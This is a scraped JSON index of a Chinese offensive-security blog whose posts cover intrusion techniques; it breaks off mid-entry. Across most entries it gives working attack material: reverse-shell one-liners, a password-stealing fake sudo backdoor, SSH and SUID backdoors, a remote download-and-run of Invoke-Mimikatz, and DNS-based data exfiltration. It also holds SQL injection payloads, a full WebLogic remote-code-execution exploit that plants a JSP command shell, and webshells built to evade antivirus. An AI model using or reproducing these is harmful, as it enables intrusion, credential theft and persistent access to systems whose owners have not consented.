12345678910111213psexecpsfilepsgetsidpsinfopskillpslistpsloggedonpsloglistpspasswdpspingpsservicepsshutdownpssuspend","text":"pstools 是微软用于管理员更方便的管理服务器的工具套件 提供很多功能比如: 远程执行命令 远程停止进程 远程更改密码 远程关机 12345678910111213psexecpsfilepsgetsidpsinfopskillpslistpsloggedonpsloglistpspasswdpspingpsservicepsshutdownpssuspend psexecpsexec 执行命令 pstools 中最强大的工具 内网渗透中也经常用到 psexec \\\\IP -u username -p password cmd arguments [-c upload-file-to-exec] pspasswd更改密码 不受密码策略的限制 pspasswd \\\\IP -u username -p password change-pass-user change-password pskill杀掉进程 pskill \\\\IP -u username -p password process-name pslist列出进程 pslist \\\\IP -u username -p password psinfopsinfo \\\\IP -u username -p password 查看系统信息 psloggedon查看当前登录用户 psloggendon \\\\IP psgetsid获取系统 sid 用于创建黄金票据 psgetsid \\\\IP","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"pstools","slug":"pstools","permalink":"https://exp10it.cn/tags/pstools/"}]},{"title":"将 shell 升级为交互式 tty","slug":"update-shell-into-tty","date":"2018-02-15T16:00:00.000Z","updated":"2018-08-02T03:00:59.709Z","comments":true,"path":"2018/02/16/update-shell-into-tty/","link":"","permalink":"https://exp10it.cn/2018/02/16/update-shell-into-tty/","excerpt":"利用 nc bash 反弹的 shell 虽然能执行一些基本的命令 但对于 su sudo vim 这些需要交互的程序 就没有什么卵用 123456789pi@orangepizero:~$ nc -lvvp 4444Listening on any address 4444Connection from 127.0.0.1:33152pi@orangepizero:~$pi@orangepizero:~$ sususu: must be run from a terminalpi@orangepizero:~$ su: must be run from a terminal","text":"利用 nc bash 反弹的 shell 虽然能执行一些基本的命令 但对于 su sudo vim 这些需要交互的程序 就没有什么卵用 123456789pi@orangepizero:~$ nc -lvvp 4444Listening on any address 4444Connection from 127.0.0.1:33152pi@orangepizero:~$pi@orangepizero:~$ sususu: must be run from a terminalpi@orangepizero:~$ su: must be run from a terminal pythonPython 中的 pty 库可以衍生一个原生的终端 python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; 123456789101112pi@orangepizero:~$ nc -lvvp 4444Listening on any address 4444Connection from 127.0.0.1:33156pi@orangepizero:~$pi@orangepizero:~$ python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;pi@orangepizero:~$pi@orangepizero:~$ suPassword: rootroot@orangepizero:/home/pi# socatsocat netcat pro Server: socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:ip:4444Client: socat file:[反引号]tty[反引号],raw,echo=0 tcp-listen:4444 123456pi@orangepizero:~$ socat file:`tty`,raw,echo=0 tcp-listen:4444pi@orangepizero:~$pi@orangepizero:~$ suPassword:root@orangepizero:/home/pi#","categories":[{"name":"linux","slug":"linux","permalink":"https://exp10it.cn/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://exp10it.cn/tags/linux/"}]},{"title":"linux sudo backdoor","slug":"linux-sudo-backdoor","date":"2018-02-14T16:00:00.000Z","updated":"2018-08-02T03:00:53.301Z","comments":true,"path":"2018/02/15/linux-sudo-backdoor/","link":"","permalink":"https://exp10it.cn/2018/02/15/linux-sudo-backdoor/","excerpt":"sudo 是 linux 系统管理指令, 是允许系统管理员让普通用户执行一些或者全部的 root 命令的一个工具, 如 halt、reboot、su 等等. 本来想写 su 后门的 但 su 没有密码重试 利用 sudo 密码错误出现的 Sorry try again 记录密码 第二次输入的时候执行真正的 sudo","text":"sudo 是 linux 系统管理指令, 是允许系统管理员让普通用户执行一些或者全部的 root 命令的一个工具, 如 halt、reboot、su 等等. 本来想写 su 后门的 但 su 没有密码重试 利用 sudo 密码错误出现的 Sorry try again 记录密码 第二次输入的时候执行真正的 sudo 代码 12345678910111213141516171819#!/usr/bin/pythonimport getpassimport timeimport sysimport oslog = &apos;/tmp/.log&apos;sudo = &apos;/usr/bin/sudo1&apos;user = getpass.getuser()ctime = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time()))with open(log,&apos;a+&apos;) as f: password = getpass.getpass(prompt=&apos;[sudo] password for &apos;+user+&apos;:&apos;) f.write(password+&apos; --- &apos;+ctime+&apos;\\n&apos;)time.sleep(1)print &apos;Sorry, try again.&apos;os.system(sudo+&apos; &apos;+&apos; &apos;.join(sys.argv[1:])) 安装 chmod 4755 ./sudochown root:root ./sudomv /usr/bin/sudo /usr/bin/sudo1mv ./sudo /usr/bin/sudo 日志 12test --- 2018-2-14 10:05root --- 2018-2-14 11:20","categories":[{"name":"linux","slug":"linux","permalink":"https://exp10it.cn/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://exp10it.cn/tags/linux/"},{"name":"backdoor","slug":"backdoor","permalink":"https://exp10it.cn/tags/backdoor/"}]},{"title":"netcat 使用技巧","slug":"netcat-tricks","date":"2018-02-13T16:00:00.000Z","updated":"2018-08-02T03:00:41.461Z","comments":true,"path":"2018/02/14/netcat-tricks/","link":"","permalink":"https://exp10it.cn/2018/02/14/netcat-tricks/","excerpt":"netcat 是一个用于 TCP/UDP 连接和监听的 linux 工具, 主要用于网络传输及调试领域. 瑞士军刀 聊天室Server: nc -l -p portClient: nc ip port 此时在 client 输入任何内容都会在 server 中显示 端口扫描nc -v ip portnc -v ip port-port","text":"netcat 是一个用于 TCP/UDP 连接和监听的 linux 工具, 主要用于网络传输及调试领域. 瑞士军刀 聊天室Server: nc -l -p portClient: nc ip port 此时在 client 输入任何内容都会在 server 中显示 端口扫描nc -v ip portnc -v ip port-port 参数 123-v 详细输出 -vv 更详细-w sec 设置超时时间 单位秒-z 在扫描端口后立即关闭连接 exnc -vv -w 3 -z 10.0.0.1 1-65535 正向连接Server: nc -l -p port -e /bin/bashClient: nc ip port 参数 1-e 连接后执行的程序 client 连接 server 有时会被防火墙拦截 反向连接Client: nc -vv -l -p portServer: nc -e /bin/bash ip port server 连接 client 不会被防火墙拦截 数据传输发送Client: nc ip port &lt; fileServer: nc -d -l -p port &gt; file 参数 12&lt; 输入重定向&gt; 输出重定向 接收Server: nc -d -l -p port &lt; fileClient: nc ip port &gt; file 蜜罐nc -L -p port 参数 1-L 持续监听","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"netcat","slug":"netcat","permalink":"https://exp10it.cn/tags/netcat/"}]},{"title":"php 常用伪协议","slug":"common-php-protocol","date":"2018-02-12T16:00:00.000Z","updated":"2018-08-02T03:00:35.805Z","comments":true,"path":"2018/02/13/common-php-protocol/","link":"","permalink":"https://exp10it.cn/2018/02/13/common-php-protocol/","excerpt":"php://stdin php://stdout php://sterr php://input php://output php://filter php://stdin从控制台读取输入 123456&lt;?php$f = fopen(&apos;php://stdin&apos;,&apos;r&apos;);while(!feof($f))&#123; echo &apos;output:&apos;.fgets($f);&#125;?&gt;","text":"php://stdin php://stdout php://sterr php://input php://output php://filter php://stdin从控制台读取输入 123456&lt;?php$f = fopen(&apos;php://stdin&apos;,&apos;r&apos;);while(!feof($f))&#123; echo &apos;output:&apos;.fgets($f);&#125;?&gt; php://stdout输出 类似于 echo 12345&lt;?php$f = fopen(&apos;php://stdout&apos;,&apos;w&apos;);fwrite($f,&apos;test&apos;);fclose($f);?&gt; php://stderr和 php://stdout 一样 php://input读取 POST 数据 作为 php 代码执行 123&lt;?phpecho file_get_contents(&apos;php://input&apos;);?&gt; php://output输出 12345&lt;?php$f = fopen(&apos;php://output&apos;,&apos;w&apos;);fwrite($f,&apos;test&apos;);fclose($f)?&gt; php://filterphp 元封装器 类似于 readfile() file_get_contents() 读取文件内容 这个在 ctf 中用的比较多 常用过滤器 12345678910string.rot13string.toupperstring.tolowerstring.strip_tagsconvert.base64-encodeconvert.base64-decodeconvert.quoted-printable-encodeconvert.quoted-printable-decode 代码 123&lt;?phpecho file_get_contents($_GET[&apos;file&apos;]);?&gt; base64 encode tolower","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/tags/note/"},{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"}]},{"title":"mimikatz bypass AV","slug":"mimikatz-bypass-av","date":"2018-02-11T16:00:00.000Z","updated":"2018-08-02T03:00:32.317Z","comments":true,"path":"2018/02/12/mimikatz-bypass-av/","link":"","permalink":"https://exp10it.cn/2018/02/12/mimikatz-bypass-av/","excerpt":"mimikatz 是由 C 编写的开源小工具, 支持从 Windows 系统内存中提取明文密码、哈希、PIN 码和 Kerberos 凭证、pass-the-hash、pass-the-ticket、build Golden tickets. procdump利用 procdump 导出 lsass.exe 在内存里的数据 之后 mimikatz 本地读取 操作系统版本要一致","text":"mimikatz 是由 C 编写的开源小工具, 支持从 Windows 系统内存中提取明文密码、哈希、PIN 码和 Kerberos 凭证、pass-the-hash、pass-the-ticket、build Golden tickets. procdump利用 procdump 导出 lsass.exe 在内存里的数据 之后 mimikatz 本地读取 操作系统版本要一致 sekurlsa::minidump lsass.dmpsekurlsa::logonpasswords Invoke-Mimikatz内存中执行 不会在本地储存文件 前提是要支持 powershell powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz&quot;","categories":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/categories/bypass/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"},{"name":"mimikatz","slug":"mimikatz","permalink":"https://exp10it.cn/tags/mimikatz/"}]},{"title":"利用 dnslog 回显","slug":"dnslog-echo","date":"2018-02-09T16:00:00.000Z","updated":"2018-08-02T03:00:28.445Z","comments":true,"path":"2018/02/10/dnslog-echo/","link":"","permalink":"https://exp10it.cn/2018/02/10/dnslog-echo/","excerpt":"DNS 在解析的时候会留下日志, 咱们这个就是读取多级域名的解析日志, 来获取信息 简单来说就是把信息放在二级域名中, 传递到自己这, 然后读取日志, 获取信息 利用 dnslog 可以回显 sql 盲注的数据、命令执行的结果等 知道创宇的 dnslog 平台 ceye.io","text":"DNS 在解析的时候会留下日志, 咱们这个就是读取多级域名的解析日志, 来获取信息 简单来说就是把信息放在二级域名中, 传递到自己这, 然后读取日志, 获取信息 利用 dnslog 可以回显 sql 盲注的数据、命令执行的结果等 知道创宇的 dnslog 平台 ceye.io 登录之后 右上角 Profile Identifier 就是 dnslog 测试地址 访问 test.xxoo.ceye.io 后台 dnslog 记录 SQL 盲注以 mysql 为例 load_file(&#39;\\\\\\\\xxoo.com\\\\&#39;) 可以发起网络请求 记录 盲注 and if((select load_file(concat(&#39;\\\\\\\\&#39;,(PAYLOAD),&#39;.xxoo.ceye.io\\\\abc&#39;))),1,1) 因为不能直接 id=1 and select xxx 就用 if 来执行 PAYLOAD 记得写上 limit 命令执行linux执行反引号内的内容并作为结果输出 curl [反引号]whoami[反引号].xxoo.ceye.ioping [反引号]whoami[反引号].xxoo.ceye.io dnslog windows感觉鸡肋啊… ping %OS%.xxoo.ceye.io %OS% 操作系统名称","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://exp10it.cn/tags/sql/"},{"name":"dnslog","slug":"dnslog","permalink":"https://exp10it.cn/tags/dnslog/"}]},{"title":"mysql updatexml 注入","slug":"mysql-updatexml-inject","date":"2018-02-06T16:00:00.000Z","updated":"2018-08-02T03:00:25.149Z","comments":true,"path":"2018/02/07/mysql-updatexml-inject/","link":"","permalink":"https://exp10it.cn/2018/02/07/mysql-updatexml-inject/","excerpt":"IntroductionUPDATEXML (XML_document, XPath_string, new_value); 12345XML_document: String 格式, 为 XML 文档对象的名称XPath_string: Xpath 语法 new_value: String 格式, 替换查找到的符合条件的数据 作用: 改变文档中符合条件的节点的值","text":"IntroductionUPDATEXML (XML_document, XPath_string, new_value); 12345XML_document: String 格式, 为 XML 文档对象的名称XPath_string: Xpath 语法 new_value: String 格式, 替换查找到的符合条件的数据 作用: 改变文档中符合条件的节点的值 Code123456&lt;?php$conn = mysqli_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;,&apos;test&apos;);$count = $_GET[&apos;count&apos;];$sql = &apos;update hit set count=&apos;.$count;$result = mysqli_query($conn,$sql) or die(mysqli_error($conn));?&gt; Payloadcount=1 and updatexml(1,concat(0x7e,(PAYLOAD),0x7e),1) PAYLOAD 自行替换 记得加上 limit updatexml() 最大返回 32 位 可以用 left() or substr() mid() 来截取后面的内容 ResultXPATH syntax error:&#39;~root@localhost~&#39;","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://exp10it.cn/tags/mysql/"},{"name":"note","slug":"note","permalink":"https://exp10it.cn/tags/note/"}]},{"title":"weblogic RCE 复现","slug":"weblogic-rce-vuln","date":"2018-02-05T16:00:00.000Z","updated":"2018-08-02T03:00:21.725Z","comments":true,"path":"2018/02/06/weblogic-rce-vuln/","link":"","permalink":"https://exp10it.cn/2018/02/06/weblogic-rce-vuln/","excerpt":"WebLogic 是美国 Oracle 公司出品的 application server, 是一个基于 JAVAEE 架构的中间件. WebLogic Server 组件的 WLS Security 子组件存在安全漏洞, 可造成任意代码执行.","text":"WebLogic 是美国 Oracle 公司出品的 application server, 是一个基于 JAVAEE 架构的中间件. WebLogic Server 组件的 WLS Security 子组件存在安全漏洞, 可造成任意代码执行. poc 123456789101112131415161718192021222324POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.2.100:7001User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Connection: closeUpgrade-Insecure-Requests: 1Content-Type: text/xmlContent-Length: 582&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt; &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/vuln.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt; &lt;string&gt;weblogic&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt; &lt;/object&gt; &lt;/java&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 发送代码 访问 /bea_wls_internal/vuln.jsp 本地查看 已经生成成功 exp 123456789101112131415161718192021import requestsimport sysdef exploit(url,filename): content = &apos;&lt;% if(&quot;weblogic&quot;.equals(request.getParameter(&quot;pass&quot;)))&#123;java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();int a = -1;byte[] b = new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a=in.read(b))!=-1)&#123;out.println(new String(b));&#125;out.print(&quot;&lt;/pre&gt;&quot;);&#125;%&gt;&apos; payload = &apos;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java&gt;&lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;object class=&quot;java.io.PrintWriter&quot;&gt;&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/&apos;+filename+&apos;&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;&lt;string&gt;&lt;![CDATA[&apos;+content+&apos;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;&apos; headers = &#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0&apos;,&apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&apos;,&apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;,&apos;Content-Type&apos;:&apos;text/xml&apos;&#125; response = requests.post(url+&apos;/wls-wsat/CoordinatorPortType&apos;,data=payload,headers=headers) if response.status_code == 500: print &apos;Shell:&apos;,url + &apos;/bea_wls_internal/&apos; + filename + &apos;?pass=weblogic&amp;cmd=whoami&apos; else: print &apos;Fail&apos;if __name__ == &apos;__main__&apos;: print &apos;[*] WebLogic wls-wsat RCE Exp&apos; print &apos;[*] CVE-2017-3506 &amp; CVE-2017-10271&apos; print if len(sys.argv) == 3: exploit(sys.argv[1],sys.argv[2]) else: print &apos;Usage: WebLogic_Exp.py url shell.jsp&apos; backdoor.jsp","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"weblogic","slug":"weblogic","permalink":"https://exp10it.cn/tags/weblogic/"}]},{"title":"php bypass D盾","slug":"php-bypass-d","date":"2018-02-05T16:00:00.000Z","updated":"2018-08-02T03:00:18.445Z","comments":true,"path":"2018/02/06/php-bypass-d/","link":"","permalink":"https://exp10it.cn/2018/02/06/php-bypass-d/","excerpt":"","text":"原理通过 array_map 对 GET 的参数进行回调, 其中 1 为回调函数, 2 和 3 分别为在回调函数内的 POST 和 GET 参数 123456&lt;?php@$a = array($_POST[&apos;2&apos;],$_GET[&apos;3&apos;]);@array_map($b=$_GET[&apos;1&apos;],$c=$a);?&gt;","categories":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/categories/bypass/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"},{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"}]},{"title":"phpcms authkey 注入","slug":"phpcms-authkey-injection","date":"2018-02-03T16:00:00.000Z","updated":"2018-08-02T03:00:15.317Z","comments":true,"path":"2018/02/04/phpcms-authkey-injection/","link":"","permalink":"https://exp10it.cn/2018/02/04/phpcms-authkey-injection/","excerpt":"phpcms 在安装时, 由于在同一个页面中连续使用 mt_rand(), 未进行有效 mt_srand() 种子随机化操作, 导致 authkey 存在泄漏风险. 访问获取 authkey /phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=getapplist&amp;auth_data=v=1&amp;appid=1&amp;data=662dCAZSAwgFUlUJBAxbVQJXVghTWVQHVFMEV1MRX11cBFMKBFMGHkUROlhBTVFuW1FJBAUVBwIXRlgeERUHQVlIUVJAA0lRXABSQEwNXAhZVl5V","text":"phpcms 在安装时, 由于在同一个页面中连续使用 mt_rand(), 未进行有效 mt_srand() 种子随机化操作, 导致 authkey 存在泄漏风险. 访问获取 authkey /phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=getapplist&amp;auth_data=v=1&amp;appid=1&amp;data=662dCAZSAwgFUlUJBAxbVQJXVghTWVQHVFMEV1MRX11cBFMKBFMGHkUROlhBTVFuW1FJBAUVBwIXRlgeERUHQVlIUVJAA0lRXABSQEwNXAhZVl5V 在 exp 中更改 url 与 authkey 运行 原来是直接 echo 出来的 序列化后不方便看 我就直接反序列化再 print_r 输出了 更改 uid 可以爆出不同的账户信息 exp phpv9 authkey.zip","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://exp10it.cn/tags/sql/"},{"name":"phpcms","slug":"phpcms","permalink":"https://exp10it.cn/tags/phpcms/"}]},{"title":"phpcms SQL 注入","slug":"phpcms-sql-injection","date":"2018-02-02T16:00:00.000Z","updated":"2018-08-02T03:00:10.877Z","comments":true,"path":"2018/02/03/phpcms-sql-injection/","link":"","permalink":"https://exp10it.cn/2018/02/03/phpcms-sql-injection/","excerpt":"PHPCMS 是一款网站管理软件. 该软件采用模块化开发, 支持多种分类方式, 使用它可方便实现个性化网站的设计、开发与维护. phpcms v9.6 SQL 注入 /index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1 获取 set-cookie 的值","text":"PHPCMS 是一款网站管理软件. 该软件采用模块化开发, 支持多种分类方式, 使用它可方便实现个性化网站的设计、开发与维护. phpcms v9.6 SQL 注入 /index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1 获取 set-cookie 的值 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26 post 传入 userid_flash 内容是刚刚获取到的 cookie 如果不成功的话 在 header 里面加上 Content-Type: application/x-www-form-urlencoded 复制 set-cookie 里的 json /index.php?m=content&amp;c=down&amp;a_k=json 解密 root@localhost v9sql exp v9sql.zip","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://exp10it.cn/tags/sql/"},{"name":"phpcms","slug":"phpcms","permalink":"https://exp10it.cn/tags/phpcms/"}]},{"title":"phpcms 后台 getshell","slug":"phpcms-getshell","date":"2018-02-01T16:00:00.000Z","updated":"2018-08-02T03:00:07.197Z","comments":true,"path":"2018/02/02/phpcms-getshell/","link":"","permalink":"https://exp10it.cn/2018/02/02/phpcms-getshell/","excerpt":"内容 - 专题 - 添加专题","text":"内容 - 专题 - 添加专题 专题导读 &lt;?php file_put_contents(&#39;0.php&#39;,base64_decode(&#39;PD9waHAgYXNzZXJ0KCRfUE9TVFswXSk7Pz4=&#39;)); ?&gt; 保存 再添加专题 扩展设置 F12 定位 专题首页 value 要与之前添加的专题名对应 ../../../../html/special/test/index 保存 网站根目录下生成 0.php 密码 0","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"getshell","slug":"getshell","permalink":"https://exp10it.cn/tags/getshell/"},{"name":"phpcms","slug":"phpcms","permalink":"https://exp10it.cn/tags/phpcms/"}]},{"title":"asp bypass safedog","slug":"asp-bypass-safedog","date":"2018-01-31T16:00:00.000Z","updated":"2018-08-02T03:00:03.213Z","comments":true,"path":"2018/02/01/asp-bypass-safedog/","link":"","permalink":"https://exp10it.cn/2018/02/01/asp-bypass-safedog/","excerpt":"","text":"原理未知 安全狗竟然查杀不了这么 nb 的 code 123456&lt;% dim x1,x2 x1 = request(&quot;pass&quot;) x2 = x1 eval x2 %&gt;","categories":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/categories/bypass/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"},{"name":"asp","slug":"asp","permalink":"https://exp10it.cn/tags/asp/"}]},{"title":"php 菜刀中转脚本","slug":"php-transfer-script","date":"2018-01-30T16:00:00.000Z","updated":"2018-08-02T02:59:59.469Z","comments":true,"path":"2018/01/31/php-transfer-script/","link":"","permalink":"https://exp10it.cn/2018/01/31/php-transfer-script/","excerpt":"有的服务器 管理员脑抽把 POST 方法禁止 而菜刀是利用 POST 来发送执行代码的 只要把 POST 转换成 GET 就可以正常链接了","text":"有的服务器 管理员脑抽把 POST 方法禁止 而菜刀是利用 POST 来发送执行代码的 只要把 POST 转换成 GET 就可以正常链接了 因为文件上传依赖 POST 所以禁止 POST 的话是不能上传文件的 中转脚本 12345678910111213141516171819&lt;?phpini_set(&apos;max_execution_time&apos;, &apos;100&apos;); // 超时时间$url = &apos;http://127.0.0.1/cmd.php&apos;; // 一句话地址$pass = &apos;cmd&apos;; // 密码$data = $_POST[&apos;cmd&apos;]; // 中转密码echo file_get_contents($url.&apos;?&apos;.$pass.&apos;=&apos;.$data);if(isset($_GET[&apos;upload&apos;]))&#123; $f = fopen(&apos;darkshell.php&apos;,&apos;r&apos;); // 上传文件 while (!feof($f))&#123; $content = base64_encode(fgetc($f)); $exec = &quot;file_put_contents(&apos;dama.php&apos;,base64_decode(&apos;$content&apos;),FILE_APPEND);&quot;; file_get_contents($url.&apos;?&apos;.$pass.&apos;=&apos;.$exec); &#125; echo &apos;File uploaded successfully&apos;;&#125;?&gt; 添加地址 成功连接 上传文件 把要上传的文件先放在网站根目录下 在中转脚本里更改打开的文件名 根据上传文件的大小更改超时时间 访问 http://127.0.0.1/hello.php?upload 等待一会 File uploaded successfully 访问","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"php","slug":"php","permalink":"https://exp10it.cn/tags/php/"}]},{"title":"星外主机跨目录技巧","slug":"star-vhost-cross-directory-tricks","date":"2018-01-26T16:00:00.000Z","updated":"2018-08-02T03:00:48.989Z","comments":true,"path":"2018/01/27/star-vhost-cross-directory-tricks/","link":"","permalink":"https://exp10it.cn/2018/01/27/star-vhost-cross-directory-tricks/","excerpt":"列目录 + 文件读取 + 文件打包 可执行文件 123456c:\\windows\\7i24IISLOG.exec:\\windows\\7i24IISLOG2.exec:\\windows\\7i24IISLOG3.exec:\\windows\\7i24IISLOG4.exec:\\windows\\7i24tool.exec:\\windows\\rsb.exe 7i24IISLOG.exe 其实就是微软的 LogParser","text":"列目录 + 文件读取 + 文件打包 可执行文件 123456c:\\windows\\7i24IISLOG.exec:\\windows\\7i24IISLOG2.exec:\\windows\\7i24IISLOG3.exec:\\windows\\7i24IISLOG4.exec:\\windows\\7i24tool.exec:\\windows\\rsb.exe 7i24IISLOG.exe 其实就是微软的 LogParser 列目录cmd: c:\\windows\\7i24IISLOG.exeargs: &quot;select top 100 path from d:\\freehost\\*.*&quot; -i:FS -rtp:-1 文件读取cmd: c:\\windows\\7i24IISLOG.exeargs: &quot;select text from d:\\freehost\\xinyuidc\\web\\admin\\index.asp&quot; -i:textline -rtp:-1 文件打包cmd: c:\\windows\\7i24IISLOG3.exeargs: d:\\freehost\\xinyuidc\\web\\ &quot;C:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\Media Index\\web.rar&quot;","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"vhost","slug":"vhost","permalink":"https://exp10it.cn/tags/vhost/"}]},{"title":"linux shell backdoor","slug":"linux-reverse-shell-and-backdoor","date":"2018-01-25T16:00:00.000Z","updated":"2018-08-02T02:59:45.773Z","comments":true,"path":"2018/01/26/linux-reverse-shell-and-backdoor/","link":"","permalink":"https://exp10it.cn/2018/01/26/linux-reverse-shell-and-backdoor/","excerpt":"反向 shell 是一种往远程机器发送 shell 命令的技术, 当远程机器处在防火墙等其它东西后面时, 这种技术会变得非常有用. 反弹 shellbashbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 ncnc ip port -e /bin/bash nc 可以从源码编译 ./configure --prefix=/tmp/nc &amp;&amp; make &amp;&amp; make install","text":"反向 shell 是一种往远程机器发送 shell 命令的技术, 当远程机器处在防火墙等其它东西后面时, 这种技术会变得非常有用. 反弹 shellbashbash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 ncnc ip port -e /bin/bash nc 可以从源码编译 ./configure --prefix=/tmp/nc &amp;&amp; make &amp;&amp; make install 后门ssh 后门ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=44444; 连接 4444 用 root/bin/ftp/mail 当用户名 密码随意 SUID 后门执行用户会获得该文件所有者的权限 cp /bin/sh /tmp/.shell &amp;&amp; chmod 4755 /tmp/.shell 执行 /tmp/.shell -p 即可获得 root 权限","categories":[{"name":"linux","slug":"linux","permalink":"https://exp10it.cn/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://exp10it.cn/tags/linux/"},{"name":"backdoor","slug":"backdoor","permalink":"https://exp10it.cn/tags/backdoor/"}]},{"title":"diryc0w linux 提权","slug":"dirtyc0w-linux-exploit","date":"2018-01-20T16:00:00.000Z","updated":"2018-08-02T02:59:43.053Z","comments":true,"path":"2018/01/21/dirtyc0w-linux-exploit/","link":"","permalink":"https://exp10it.cn/2018/01/21/dirtyc0w-linux-exploit/","excerpt":"Linux 内核的内存子系统在处理写时拷贝 (Copy-on-Write) 时存在条件竞争漏洞, 导致可以破坏私有只读内存映射. 影响范围 Linux kernel &gt;= 2.6.22 基本上2007年到2016年的版本都有这个漏洞","text":"Linux 内核的内存子系统在处理写时拷贝 (Copy-on-Write) 时存在条件竞争漏洞, 导致可以破坏私有只读内存映射. 影响范围 Linux kernel &gt;= 2.6.22 基本上2007年到2016年的版本都有这个漏洞 dircyc0w 内核版本 编译 gcc -pthread dirty.c -o dirty -lcrypt 运行 ./dirty yourpassword 切换到 firefart 用户 uid = 0 root 权限 如果是在反弹的 shell 里执行 直接连接 ssh 别忘了恢复原来的 passwd 文件","categories":[{"name":"linux","slug":"linux","permalink":"https://exp10it.cn/categories/linux/"}],"tags":[{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/tags/exploit/"},{"name":"linux","slug":"linux","permalink":"https://exp10it.cn/tags/linux/"}]},{"title":"mssql error-based 